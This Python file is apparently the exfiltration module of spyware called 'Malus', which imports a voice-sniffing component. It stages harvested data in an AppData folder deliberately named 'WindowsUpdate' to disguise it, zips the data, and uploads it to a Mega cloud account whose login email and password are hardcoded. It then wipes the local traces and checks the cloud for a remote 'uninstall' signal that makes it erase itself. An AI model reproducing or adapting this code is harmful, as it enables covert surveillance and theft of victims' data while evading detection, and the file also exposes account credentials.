import threading

from mega import Mega
import shutil
from datetime import datetime

import voiceSniffer, fileManager
from properties import APPDATA_PATH

cloud_folder_name = "Malus"
api_id = "1234"

mega = Mega()


class TransferProvider:

    def __init__(self, email: str = "jan.praks128@gmail.com", password: str = "blackspades10"):
        self.email = email
        self.password = password
        self.mega_profile = mega.login(self.email, self.password)

    def establish_connection(self):
        self.transport()
        self.check_cloud_folder()

    def transport(self):
        print("Transport run")
        upload_folder_name = str(datetime.now()).replace(":", "_")
        # WindowsUpdate is fake random name for our folder
        transport_path = APPDATA_PATH + "\\WindowsUpdate\\"
        transport_folder = transport_path + upload_folder_name
        data_folder = APPDATA_PATH + "\\web"
        fileManager.make_road(transport_path)

        # compress obtained data to zip file
        shutil.make_archive(data_folder, 'zip', transport_folder)

        # upload zip file to a cloud
        path_to_data = transport_folder + ".zip"
        folder = self.mega_profile.find(cloud_folder_name)
        self.mega_profile.upload(path_to_data, folder[0])

        # Erase data after uploading
        shutil.rmtree(transport_path, ignore_errors=True)
        shutil.rmtree(data_folder, ignore_errors=True)

    def check_cloud_folder(self):
        foler_name = api_id+" uninstall"
        folder = self.mega_profile.find(foler_name)
        if folder is not None:
            print("Removing application")
            fileManager.erase_api()

# tp = TransferProvider()
# tp.establish_connection()